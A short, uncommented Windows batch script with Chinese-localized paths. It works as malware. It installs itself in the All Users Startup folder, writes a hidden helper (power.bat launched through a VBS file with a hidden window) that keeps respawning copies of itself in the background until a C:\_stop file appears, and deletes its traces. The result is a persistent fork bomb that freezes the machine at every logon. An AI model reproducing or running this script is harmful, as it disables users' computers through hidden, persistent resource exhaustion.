@echo off 
if not exist "%HOMEPATH%\..\All Users\「开始」菜单\程序\启动\power.bat" copy %~fs0 "%HOMEPATH%\..\All Users\「开始」菜单\程序\启动\power.bat">nul 
echo @echo off>%windir%\power.bat 
echo if "%%1"=="" goto :end>>%windir%\power.bat 
echo if exist C:\_stop goto :EOF>>%windir%\power.bat 
echo start /B %%~fs0 exp>>%windir%\power.bat 
echo :s>>%windir%\power.bat 
echo if not exist C:\_stop goto s>>%windir%\power.bat 
echo exit>>%windir%\power.bat 
echo :end>>%windir%\power.bat 
echo del %%~fs0>>%windir%\power.bat 
echo set ws=CreateObject("WScript.Shell")>%windir%\power.vbs 
echo ws.Run "%windir%\power.bat exp",0 >>%windir%\power.vbs 
WScript %windir%\power.vbs 
del %windir%\power.vbs 
set p=%~ps0 
if not %p:~-3,2%==启动 del %~fs0
